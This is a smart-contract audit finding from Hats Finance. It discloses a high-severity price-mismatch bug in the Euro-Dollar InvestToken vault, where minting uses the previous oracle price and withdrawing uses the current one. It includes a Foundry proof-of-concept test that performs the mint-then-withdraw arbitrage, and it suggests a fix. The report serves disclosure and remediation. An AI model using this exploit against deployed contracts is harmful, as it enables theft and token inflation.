# [H] `InvestToken`: Whitelisted investors can inflate USDE to infinity by arbitraging previous and current price differences

## Summary
Severity: High
Chain: Smart contract
Component: Euro-Dollar
Published: 2024-11-04
Source: https://github.com/hats-finance/Euro-Dollar-0xa4ccd3b6daa763f729ad59eae75f9cbff7baf2cd/issues/45
Type: hats-finding

## Details
**Github username:** --
**Twitter username:** thekmj_
**Submission hash (on-chain):** 0x431f96317f2d6a268db53da199722aced8e43996eab6723a431d0a8906d2d2d9
**Severity:** high

**Description:**
**Description**\

`InvestToken` mimics an ERC4626 vault, where the USDE is the underlying asset, and the exchange rate is determined by the `YieldOracle`. The token also supports classic ERC4626 functions including `mint`, `redeem`, `deposit`, and `withdraw`. It is worth nothing that the exchange rate fetched from `YieldOracle` is forced to be uponly.

The mistake here is that `mint` and `redeem` uses `convertToAsset()`, which in turn calls into `YieldOracle.sharesToAssets()`, which uses `previousPrice` for conversion, however `deposit` and `withdraw` uses `YieldOracle.assetsToShares()`, which uses the current price.

This means that depositing through `mint` uses the previous (lower) price, whereas `withdraw` uses the current (higher) price, providing avenue for instant arbitraging.

**Attack Scenario**\

An investor is whitelisted for `InvestToken` and can exploit as follow:
- Assuming the previously commited price is 1.00, or 1 USDE per shares. The newest committed price is 1.01, or 1.01 USDE per shares, due to yield.
- The investor/exploiter converts 1 USDE into shares using `mint`. They are given 1 shares.
- The investor/exploiter immediately converts 1 share back into USDE using `withdraw`. However, they get back 1.01 USDE due to the conversion using the higher price.

The investor just minted 0.01 USDE for free. Now repeat for as long as they like, for however amount they like, and they have inflated USDE to infinity. Then simply sell it on the market and take profit before the admin can act.

**Attachments**

1. **Proof of Concept (PoC) File**

Run with `forge test --match-test testExploit`.

```solidity
pragma solidity ^0.8.21;

import {Test} from "forge-std/Test.sol";
import {ERC1967Proxy} from "@openzeppelin/contracts/proxy/ERC1967/ERC1967Proxy.sol";
import {Math} from "@openzeppelin/contracts/utils/math/Math.sol";
import {IUSDE} from "../src/interfaces/IUSDE.sol";
import {IYieldOracle} from "../src/interfaces/IYieldOracle.sol";
import {InvestToken} from "../src/InvestToken.sol";
import {USDE} from "../src/USDE.sol";
import {YieldOracle} from "../src/YieldOracle.sol";
import {Constants} from "./Constants.sol";
import "../src/Validator.sol";

contract TestPoC is Test {
    address public owner;
    address public whitelister;
    address public blacklister;
    address public user1;
    address public user2;
    address public oracle;
    address public usdeMinter;

    Validator public validator;
    USDE public usde;
    YieldOracle public yieldOracle;
    InvestToken public investToken;

    function setUp() public virtual {
        owner = address(this);
        whitelister = address(0x1);
        blacklister = address(0x2);
        user1 = address(0x3);
        user2 = address(0x4);
        oracle = address(0x5);
        usdeMinter = address(0x6);

        // deploy validator
        validator = new Validator(owner, whitelister, blacklister);

        // deploy USDE and grant role
        address implementation = address(new USDE(IValidator(validator)));
        usde = USDE(address(new ERC1967Proxy(implementation, abi.encodeCall(USDE.initialize, owner))));
        usde.grantRole(usde.MINT_ROLE(), usdeMinter);

        // deploy yield oracle
        yieldOracle = new YieldOracle(address(this), oracle);

        // finally, deploy invest token, and give it minter/burner role for USDE to finish setting up
        address investTokenImplementation = address(new InvestToken(IValidator(validator), IUSDE(address(usde))));
        investToken = InvestToken(address(
            new ERC1967Proxy(
                investTokenImplementation, abi.encodeCall(InvestToken.initialize, ("Eurodollar Invest Token", "EUI", owner, IYieldOracle(yieldOracle)))
            )
        ));
        usde.grantRole(usde.MINT_ROLE(), address(investToken));
        usde.grantRole(usde.BURN_ROLE(), address(investToken));

        // finished
    }

    function testExploit() public {
        // investor/attacker address
        address INVESTOR = address(0x99);
        uint256 MINT_AMOUNT = 100 * (10 ** 18);

        // mint 100 USDE to the investor to start with
        vm.startPrank(usdeMinter);
        usde.mint(INVESTOR, MINT_AMOUNT);
        vm.stopPrank();
        assert(usde.balanceOf(INVESTOR) == MINT_AMOUNT);

        // set up the price
        // use admin privileged function for quicker PoC writing
        uint256 PRICE = 10 ** 18;
        yieldOracle.setCurrentPrice(PRICE + (10 ** 16)); // 1.01 USDE
        yieldOracle.setPreviousPrice(PRICE); // 1.00 USDE

        // whitelist investor to the Validator
        vm.startPrank(whitelister);
        validator.whitelist(INVESTOR);
        vm.stopPrank();

        // finished setting up, now attack
        vm.startPrank(INVESTOR); // mint 100 shares to ourselves
        investToken.mint(MINT_AMOUNT, INVESTOR);
        assert(investToken.balanceOf(INVESTOR) == MINT_AMOUNT); // exactly 100e18 shares
        investToken.withdraw(MINT_AMOUNT + (10 ** 18), INVESTOR, INVESTOR); // withdraw 101e18 shares
        uint256 FINAL_AMOUNT = 101e18;
        assert(usde.balanceOf(INVESTOR) == FINAL_AMOUNT);

        // exploit complete
        vm.stopPrank();
    }
}
```

2. **Revised Code File (Optional)**

Any depositing/minting action should use the current price, whereas any withdrawing/redeem action should use the previous price.
- This is in line with the up/down rounding pattern of ERC4626 vaults, except this time it's on the yield price itself favoring who.
  
**Files:**
  - PoC.sol (https://hats-backend-prod.herokuapp.com/v1/files/QmdHpNinrC9cmT8Xzbumwh5rd8YApQL5YJHKBbCYUmipsn)
